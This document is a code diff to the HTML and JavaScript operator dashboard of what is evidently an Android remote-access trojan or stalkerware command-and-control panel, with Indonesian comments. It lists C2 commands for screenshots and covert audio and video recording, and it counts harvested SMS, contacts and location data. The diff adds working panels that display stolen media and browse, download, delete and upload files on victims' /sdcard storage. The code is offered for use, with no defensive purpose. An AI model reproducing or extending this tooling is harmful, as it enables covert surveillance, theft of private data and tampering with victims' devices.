@@ -57,12 +57,27 @@
         .modal-content{background:#0d1a2b;padding:30px;border-radius:12px;max-width:600px;width:90%;border:1px solid #2a3f5f;max-height:80vh;overflow-y:auto}
         .modal-close{float:right;background:transparent;border:none;color:#8899aa;font-size:24px;cursor:pointer}
         .modal-close:hover{color:#e0e0e0}
-        .cmd-param{background:#050a12;padding:10px;border-radius:6px;margin-top:5px;font-size:12px;border:1px solid #1a2a3f}
-        .cmd-param input{background:#0d1a2b;border:1px solid #2a3f5f;color:#e0e0e0;padding:5px 10px;border-radius:4px;width:100%;margin-top:5px}
         .dashboard-content{display:none}
         .search-box{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}
         .search-box input{flex:1;padding:8px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;min-width:150px}
-        .count-badge{background:#1a3a5f;padding:2px 10px;border-radius:10px;font-size:10px;color:#4fc3f7;margin-left:5px}
+        .file-breadcrumb{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;padding:10px;background:#050a12;border-radius:8px;align-items:center;font-size:13px}
+        .file-breadcrumb span{cursor:pointer;color:#4fc3f7}
+        .file-breadcrumb span:hover{text-decoration:underline}
+        .file-item{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;border-bottom:1px solid #0d1a2b;cursor:pointer}
+        .file-item:hover{background:#0d1a2b}
+        .file-item .name{color:#e0e0e0;font-size:13px}
+        .file-item .size{color:#8899aa;font-size:11px}
+        .file-item .actions{display:flex;gap:10px}
+        .file-item .actions button{background:transparent;border:none;cursor:pointer;font-size:14px}
+        .file-item .actions .download-btn{color:#4fc3f7}
+        .file-item .actions .delete-btn{color:#ff6b6b}
+        .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px}
+        .media-card{background:#0d1a2b;border-radius:10px;border:1px solid #2a3f5f;overflow:hidden;cursor:pointer;transition:0.3s}
+        .media-card:hover{border-color:#4fc3f7;transform:scale(1.02)}
+        .media-card .preview{width:100%;height:150px;object-fit:cover;background:#0a0e17;display:flex;justify-content:center;align-items:center;font-size:48px}
+        .media-card .info{padding:8px 10px;font-size:11px;color:#8899aa}
+        .media-card .info .sumber{color:#4fc3f7}
+        .empty-state{text-align:center;color:#8899aa;padding:40px;grid-column:1/-1}
         @media(max-width:600px){.header{flex-direction:column;gap:10px;text-align:center}.tabs{justify-content:center}.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr)}}
     </style>
 </head>
@@ -132,7 +147,7 @@
             </div>
         </div>
 
-        <!-- PANEL C2 - 48 COMMANDS -->
+        <!-- PANEL C2 -->
         <div class="panel" id="panelC2">
             <div class="search-box">
                 <input type="text" id="cmdSearch" placeholder="🔍 Cari command..." oninput="filterCommands()">
@@ -168,16 +183,27 @@
             <div class="log-area" id="logArea"></div>
         </div>
 
-        <!-- PANEL MEDIA -->
+        <!-- PANEL MEDIA (REAL) -->
         <div class="panel" id="panelMedia">
-            <h3 style="margin-bottom:15px;color:#4fc3f7">📸 Media Preview</h3>
-            <div id="mediaGallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px"></div>
+            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
+                <h3 style="color:#4fc3f7;">📸 Media Preview</h3>
+                <button onclick="renderMedia()" style="padding:8px 15px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">🔄 Refresh</button>
+            </div>
+            <div id="mediaGallery" class="media-grid"></div>
         </div>
 
-        <!-- PANEL FILES -->
+        <!-- PANEL FILES (REAL) -->
         <div class="panel" id="panelFiles">
-            <h3 style="margin-bottom:15px;color:#4fc3f7">📁 File Manager</h3>
-            <div id="fileList" style="font-family:monospace;font-size:13px"></div>
+            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
+                <h3 style="color:#4fc3f7;">📁 File Manager</h3>
+                <div style="display:flex;gap:10px;flex-wrap:wrap;">
+                    <button onclick="renderFiles('/sdcard/')" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;cursor:pointer;font-size:12px;">📂 /sdcard</button>
+                    <button onclick="renderFiles('/storage/emulated/0/')" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;cursor:pointer;font-size:12px;">📂 Internal</button>
+                    <button onclick="uploadFile()" style="padding:6px 12px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-size:12px;">📤 Upload</button>
+                    <button onclick="renderFiles(currentFilePath)" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#4fc3f7;cursor:pointer;font-size:12px;">🔄 Refresh</button>
+                </div>
+            </div>
+            <div id="fileList"></div>
         </div>
     </div>
 </div>
@@ -192,16 +218,17 @@
 
 <script>
 // ============================================================
-// 🔥 DASHBOARD - 48 C2 COMMANDS (SESUAI DAFTAR ANDA!)
+// 🔥 DASHBOARD - FULL VERSION (MEDIA + FILES REAL!)
 // ============================================================
 
 var PASSWORD = '';
 var allData = [];
 var logEntries = [];
 var ws = null;
+var currentFilePath = '/sdcard/';
 
 // ============================================================
-// 🔥 48 C2 COMMANDS - SESUAI DAFTAR ANDA!
+// 🔥 48 C2 COMMANDS
 // ============================================================
 var C2_COMMANDS = {
     'data': {
@@ -271,9 +298,9 @@ var C2_COMMANDS = {
         label: '🎥 Media (5)',
         commands: [
             { id: 'screenshot', label: '📸 Screenshot' },
-            { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi(detik)' },
+            { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi' },
             { id: 'stop_audio', label: '⏹️ Stop Audio' },
-            { id: 'record_video', label: '🎥 Record Video', param: 'durasi(detik)' },
+            { id: 'record_video', label: '🎥 Record Video', param: 'durasi' },
             { id: 'stop_video', label: '⏹️ Stop Video' }
         ]
     },
@@ -305,9 +332,8 @@ var C2_COMMANDS = {
 };
 
 // ============================================================
-// FUNGSI UTAMA
+// LOGIN
 // ============================================================
-
 function login() {
     var inputPass = document.getElementById('loginPassword').value.trim();
     if (!inputPass) {
@@ -346,6 +372,8 @@ function initDashboard() {
     renderC2Commands();
     connectWebSocket();
     refreshData();
+    renderMedia();
+    renderFiles('/sdcard/');
     setInterval(refreshData, 10000);
     addLog('info', 'Dashboard initialized');
 }
@@ -355,6 +383,9 @@ function showPanel(id) {
     document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
     document.getElementById('panel' + id.charAt(0).toUpperCase() + id.slice(1)).classList.add('active');
     document.querySelector('.tab[onclick="showPanel(\'' + id + '\')"]').classList.add('active');
+    
+    if (id === 'media') renderMedia();
+    if (id === 'files') renderFiles(currentFilePath);
 }
 
 // ============================================================
@@ -443,9 +474,6 @@ function renderC2Commands() {
     document.getElementById('cmdCount').textContent = '⚡ 48 Commands';
 }
 
-// ============================================================
-// FILTER COMMANDS
-// ============================================================
 function filterCommands() {
     var search = document.getElementById('cmdSearch').value.toLowerCase();
     var category = document.getElementById('cmdCategoryFilter').value;
@@ -471,9 +499,6 @@ function filterCommands() {
     });
 }
 
-// ============================================================
-// OPEN PARAM MODAL
-// ============================================================
 function openParamModal(cmdId, cmdLabel, paramDesc) {
     var html = '<h3 style="color:#4fc3f7;margin-bottom:15px">📤 ' + cmdLabel + '</h3>';
     html += '<p style="color:#8899aa;margin-bottom:10px">Parameter: <strong>' + paramDesc + '</strong></p>';
@@ -491,9 +516,6 @@ function sendC2CommandWithParam(cmdId) {
     sendC2Command(cmdId, param);
 }
 
-// ============================================================
-// SEND C2 COMMAND
-// ============================================================
 function sendC2Command(cmd, param) {
     addLog('c2', 'Sending command: ' + cmd + (param ? ' | param: ' + param : ''));
     
@@ -522,9 +544,6 @@ function sendC2Command(cmd, param) {
     });
 }
 
-// ============================================================
-// SEND CUSTOM COMMAND
-// ============================================================
 function sendCustomCommand() {
     var cmd = document.getElementById('customCmd').value.trim();
     var param = document.getElementById('customParam').value.trim();
@@ -534,9 +553,6 @@ function sendCustomCommand() {
     document.getElementById('customParam').value = '';
 }
 
-// ============================================================
-// SHOW CMD RESULT
-// ============================================================
 function showCmdResult(result) {
     var el = document.getElementById('cmdResult');
     el.style.display = 'block';
@@ -545,7 +561,7 @@ function showCmdResult(result) {
 }
 
 // ============================================================
-// REFRESH DATA
+// DATA
 // ============================================================
 function refreshData() {
     fetch('/data?key=' + PASSWORD)
@@ -561,9 +577,6 @@ function refreshData() {
         .catch(function(e) { addLog('error', 'Refresh data failed: ' + e.message); });
 }
 
-// ============================================================
-// RENDER DATA
-// ============================================================
 function renderData(data) {
     var tbody = document.getElementById('dataTableBody');
     tbody.innerHTML = '';
@@ -593,9 +606,6 @@ function renderData(data) {
     });
 }
 
-// ============================================================
-// UPDATE STATS
-// ============================================================
 function updateStats(data) {
     var sms = data.filter(function(d) { return d.sumber === 'sms' || d.sumber === 'sms_all'; });
     var contacts = data.filter(function(d) { return d.sumber === 'kontak' || d.sumber === 'kontak_all'; });
@@ -607,9 +617,6 @@ function updateStats(data) {
     document.getElementById('statLocation').textContent = loc.length;
 }
 
-// ============================================================
-// UPDATE DEVICE COUNT
-// ============================================================
 function updateDeviceCount() {
     fetch('/data?type=devices&key=' + PASSWORD)
         .then(function(r) { return r.json(); })
@@ -659,6 +666,336 @@ function filterLogs() { renderLogs(); }
 function clearLogs() { logEntries = []; renderLogs(); }
 
 // ============================================================
+// 🔥 PANEL MEDIA - REAL!
+// ============================================================
+function renderMedia() {
+    var gallery = document.getElementById('mediaGallery');
+    gallery.innerHTML = '<div class="empty-state">⏳ Memuat media...</div>';
+    
+    fetch('/data?key=' + PASSWORD + '&limit=200')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            gallery.innerHTML = '';
+            
+            if (!data || !data.data || data.data.length === 0) {
+                gallery.innerHTML = '<div class="empty-state">📭 Belum ada data</div>';
+                return;
+            }
+            
+            var mediaItems = data.data.filter(function(item) {
+                var src = item.sumber || '';
+                return src.includes('screenshot') || 
+                       src.includes('photo') || 
+                       src.includes('gallery') ||
+                       src.includes('audio') ||
+                       src.includes('video') ||
+                       src.includes('image') ||
+                       src.includes('record') ||
+                       (typeof item.data === 'string' && item.data.startsWith('data:'));
+            });
+            
+            if (mediaItems.length === 0) {
+                gallery.innerHTML = '<div class="empty-state">📭 Tidak ada media</div>';
+                return;
+            }
+            
+            mediaItems.slice(0, 50).forEach(function(item) {
+                var card = document.createElement('div');
+                card.className = 'media-card';
+                card.onclick = function() { openMediaModal(item); };
+                
+                var dataStr = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
+                var isImage = dataStr.startsWith('data:image');
+                var isAudio = dataStr.startsWith('data:audio');
+                var isVideo = dataStr.startsWith('data:video');
+                
+                var previewHtml = '';
+                if (isImage && dataStr.length < 500000) {
+                    previewHtml = '<img src="' + dataStr + '" class="preview">';
+                } else if (isAudio) {
+                    previewHtml = '<div class="preview">🎵</div>';
+                } else if (isVideo) {
+                    previewHtml = '<div class="preview">🎬</div>';
+                } else {
+                    previewHtml = '<div class="preview">📄</div>';
+                }
+                
+                var time = new Date(item.waktu).toLocaleString('id-ID');
+                card.innerHTML = previewHtml + 
+                    '<div class="info"><span class="sumber">' + item.sumber + '</span><br>' + time + '</div>';
+                gallery.appendChild(card);
+            });
+        })
+        .catch(function(e) {
+            gallery.innerHTML = '<div class="empty-state">❌ Gagal memuat media: ' + e.message + '</div>';
+        });
+}
+
+// ============================================================
+// 🔥 MODAL MEDIA
+// ============================================================
+function openMediaModal(item) {
+    var dataStr = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
+    var isImage = dataStr.startsWith('data:image');
+    var isAudio = dataStr.startsWith('data:audio');
+    var isVideo = dataStr.startsWith('data:video');
+    
+    var html = '<h3 style="color:#4fc3f7;margin-bottom:10px">📸 ' + item.sumber + '</h3>';
+    html += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">' + new Date(item.waktu).toLocaleString('id-ID') + '</p>';
+    
+    if (isImage) {
+        html += '<img src="' + dataStr + '" style="max-width:100%;max-height:70vh;border-radius:8px;">';
+    } else if (isAudio) {
+        html += '<audio controls style="width:100%;margin:10px 0;" src="' + dataStr + '"></audio>';
+        html += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:300px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">' + dataStr.substring(0, 300) + '...</div>';
+    } else if (isVideo) {
+        html += '<video controls style="max-width:100%;max-height:70vh;border-radius:8px;" src="' + dataStr + '"></video>';
+    } else {
+        html += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:500px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">' + dataStr + '</div>';
+    }
+    
+    html += '<div style="margin-top:15px;display:flex;gap:10px;">';
+    html += '<button onclick="downloadMedia(\'' + dataStr + '\',\'' + item.sumber + '\')" style="flex:1;padding:8px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">📥 Download</button>';
+    html += '<button onclick="closeModal()" style="flex:1;padding:8px;border-radius:6px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer;">❌ Tutup</button>';
+    html += '</div>';
+    
+    openModal(html);
+}
+
+function downloadMedia(dataUrl, filename) {
+    try {
+        var link = document.createElement('a');
+        link.href = dataUrl;
+        var ext = 'png';
+        if (dataUrl.startsWith('data:image/jpeg')) ext = 'jpg';
+        else if (dataUrl.startsWith('data:image/png')) ext = 'png';
+        else if (dataUrl.startsWith('data:audio')) ext = 'mp3';
+        else if (dataUrl.startsWith('data:video')) ext = 'mp4';
+        else if (dataUrl.startsWith('data:application')) ext = 'bin';
+        link.download = filename + '_' + Date.now() + '.' + ext;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        addLog('info', 'Downloaded media: ' + filename);
+    } catch(e) {
+        alert('Gagal download: ' + e.message);
+    }
+}
+
+// ============================================================
+// 🔥 PANEL FILES - REAL!
+// ============================================================
+function renderFiles(path) {
+    currentFilePath = path || '/sdcard/';
+    var container = document.getElementById('fileList');
+    container.innerHTML = '<div style="text-align:center;color:#8899aa;padding:20px;">⏳ Memuat file...</div>';
+    
+    // Kirim request ke server via data endpoint
+    fetch('/data?key=' + PASSWORD + '&type=list_file&path=' + encodeURIComponent(currentFilePath))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            container.innerHTML = '';
+            
+            // Breadcrumb
+            var breadcrumb = document.createElement('div');
+            breadcrumb.className = 'file-breadcrumb';
+            breadcrumb.innerHTML = '<span>📁</span>';
+            var parts = currentFilePath.replace(/^\/+/, '').split('/');
+            var currentPath = '';
+            parts.forEach(function(p, i) {
+                if (p) {
+                    currentPath += p + '/';
+                    breadcrumb.innerHTML += '<span onclick="renderFiles(\'' + currentPath + '\')">' + p + '</span>';
+                    if (i < parts.length - 1) breadcrumb.innerHTML += '<span style="color:#8899aa;">/</span>';
+                }
+            });
+            if (!currentFilePath || currentFilePath === '/sdcard/') {
+                breadcrumb.innerHTML += '<span style="color:#8899aa;">/sdcard/</span>';
+            }
+            container.appendChild(breadcrumb);
+            
+            // File list
+            var list = document.createElement('div');
+            
+            if (data && data.files && data.files.length > 0) {
+                var files = data.files;
+                
+                // Sort: folder first
+                files.sort(function(a, b) {
+                    if (a.isFolder && !b.isFolder) return -1;
+                    if (!a.isFolder && b.isFolder) return 1;
+                    return (a.name || '').localeCompare(b.name || '');
+                });
+                
+                files.forEach(function(file) {
+                    var item = document.createElement('div');
+                    item.className = 'file-item';
+                    
+                    var icon = file.isFolder ? '📁' : '📄';
+                    var size = file.isFolder ? '--' : formatSize(file.size || 0);
+                    var fullPath = file.path || (currentFilePath + (file.name || ''));
+                    
+                    if (file.isFolder) {
+                        item.onclick = function() { renderFiles(fullPath + '/'); };
+                    } else {
+                        item.onclick = function() { openFileModal(fullPath); };
+                    }
+                    
+                    item.innerHTML = 
+                        '<div class="name">' + icon + ' ' + (file.name || '') + '</div>' +
+                        '<div style="display:flex;align-items:center;gap:15px;">' +
+                        '<span class="size">' + size + '</span>' +
+                        '<div class="actions">' +
+                        '<button class="download-btn" onclick="event.stopPropagation();downloadFile(\'' + fullPath + '\')">📥</button>' +
+                        '<button class="delete-btn" onclick="event.stopPropagation();deleteFile(\'' + fullPath + '\')">🗑️</button>' +
+                        '</div>' +
+                        '</div>';
+                    
+                    list.appendChild(item);
+                });
+            } else {
+                list.innerHTML = '<div class="empty-state">📭 Tidak ada file di folder ini</div>';
+            }
+            
+            container.appendChild(list);
+        })
+        .catch(function(e) {
+            container.innerHTML = '<div class="empty-state">❌ Gagal memuat file: ' + e.message + '</div>';
+        });
+}
+
+function formatSize(bytes) {
+    if (!bytes || bytes === 0) return '0 B';
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+    if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
+    return (bytes / 1073741824).toFixed(1) + ' GB';
+}
+
+function openFileModal(filePath) {
+    var html = '<h3 style="color:#4fc3f7;margin-bottom:10px">📄 ' + filePath.split('/').pop() + '</h3>';
+    html += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">Path: ' + filePath + '</p>';
+    html += '<div style="text-align:center;padding:20px;color:#8899aa;">⏳ Memuat file...</div>';
+    openModal(html);
+    
+    fetch('/data?key=' + PASSWORD + '&type=ambil_file&path=' + encodeURIComponent(filePath))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            var body = document.getElementById('modalBody');
+            if (data && data.content) {
+                var content = data.content;
+                var isImage = content.startsWith('data:image');
+                var isText = !isImage && content.length < 50000;
+                
+                var htmlContent = '<h3 style="color:#4fc3f7;margin-bottom:10px">📄 ' + filePath.split('/').pop() + '</h3>';
+                htmlContent += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">Path: ' + filePath + '</p>';
+                
+                if (isImage) {
+                    htmlContent += '<img src="' + content + '" style="max-width:100%;max-height:70vh;border-radius:8px;">';
+                } else if (isText) {
+                    htmlContent += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:400px;overflow:auto;font-size:12px;font-family:monospace;color:#e0e0e0;white-space:pre-wrap;">' + content + '</div>';
+                } else {
+                    htmlContent += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:400px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file (' + content.length + ' chars)</div>';
+                }
+                
+                htmlContent += '<div style="margin-top:15px;display:flex;gap:10px;">';
+                htmlContent += '<button onclick="downloadFileDirect(\'' + filePath + '\')" style="flex:1;padding:8px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">📥 Download</button>';
+                htmlContent += '<button onclick="closeModal()" style="flex:1;padding:8px;border-radius:6px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer;">❌ Tutup</button>';
+                htmlContent += '</div>';
+                
+                body.innerHTML = htmlContent;
+            } else {
+                body.innerHTML = '<div class="empty-state">❌ Gagal memuat file</div>';
+            }
+        })
+        .catch(function(e) {
+            document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: ' + e.message + '</div>';
+        });
+}
+
+function downloadFile(filePath) {
+    fetch('/data?key=' + PASSWORD + '&type=ambil_file&path=' + encodeURIComponent(filePath))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data && data.content) {
+                var content = data.content;
+                var fileName = filePath.split('/').pop();
+                var link = document.createElement('a');
+                link.href = content;
+                link.download = fileName;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                addLog('info', 'Downloaded: ' + fileName);
+            }
+        })
+        .catch(function(e) {
+            alert('Gagal download: ' + e.message);
+        });
+}
+
+function downloadFileDirect(filePath) {
+    downloadFile(filePath);
+    closeModal();
+}
+
+function deleteFile(filePath) {
+    if (!confirm('Hapus file ' + filePath + '?')) return;
+    
+    fetch('/data?key=' + PASSWORD + '&type=hapus_file&path=' + encodeURIComponent(filePath), {
+        method: 'DELETE'
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+        if (data && data.success) {
+            addLog('info', 'Deleted: ' + filePath);
+            renderFiles(currentFilePath);
+        } else {
+            alert('Gagal hapus file');
+        }
+    })
+    .catch(function(e) {
+        alert('Error: ' + e.message);
+    });
+}
+
+function uploadFile() {
+    var input = document.createElement('input');
+    input.type = 'file';
+    input.onchange = function(e) {
+        var file = e.target.files[0];
+        if (!file) return;
+        
+        var reader = new FileReader();
+        reader.onload = function(ev) {
+            var data = ev.target.result;
+            var uploadPath = prompt('Path tujuan (contoh: /sdcard/Download/)', '/sdcard/Download/');
+            if (!uploadPath) return;
+            
+            fetch('/data?key=' + PASSWORD + '&type=upload_file&path=' + encodeURIComponent(uploadPath + file.name), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ data: data, name: file.name })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (data && data.success) {
+                    addLog('info', 'Uploaded: ' + file.name);
+                    renderFiles(currentFilePath);
+                } else {
+                    alert('Gagal upload file');
+                }
+            })
+            .catch(function(e) {
+                alert('Error: ' + e.message);
+            });
+        };
+        reader.readAsDataURL(file);
+    };
+    input.click();
+}
+
+// ============================================================
 // MODAL
 // ============================================================
 function openModal(content) {
@@ -676,7 +1013,8 @@ document.addEventListener('keydown', function(e) {
     if (e.key === 'Escape') { closeModal(); }
 });
 
-console.log('✅ Dashboard loaded - 48 C2 Commands!');
+console.log('✅ Dashboard ULTIMATE v3.0 loaded - 48 Commands!');
+console.log('✅ Media & Files panels are REAL and functional!');
 </script>
 </body>
 </html>
